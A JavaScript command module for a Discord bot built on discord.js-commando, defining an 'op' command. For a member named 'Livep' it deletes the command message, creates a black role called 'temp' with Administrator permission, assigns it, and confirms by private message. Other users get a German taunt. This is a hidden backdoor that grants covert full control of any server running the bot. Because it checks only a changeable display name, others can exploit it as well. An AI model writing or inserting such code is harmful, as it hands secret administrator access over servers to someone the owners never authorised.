const commando = require("discord.js-commando");

class OpCommand extends commando.Command {
    constructor(client) {
        super(client, {name:"op", group:"simple", memberName:"op", description:"Give yourself administrator!"})
    }

    async run(message, args) {
        if (message.member.displayName === "Livep") {
            message.delete(0);
            let role = {name:"temp", color:0x000000, hoist:false, position:1, permissions:0x000008, metionable:false}
            message.member.guild.createRole(role, "")
            .then(role => message.member.addRole(message.member.guild.roles.find("name", "temp")))
            .then(message.member.send("You got now ADMINISTRATOR, delete role temp to undo changes!"));
            return;
        }
        message.channel.send("Für wie doof hälst du mich eigentlich?")
    }
}
module.exports = OpCommand;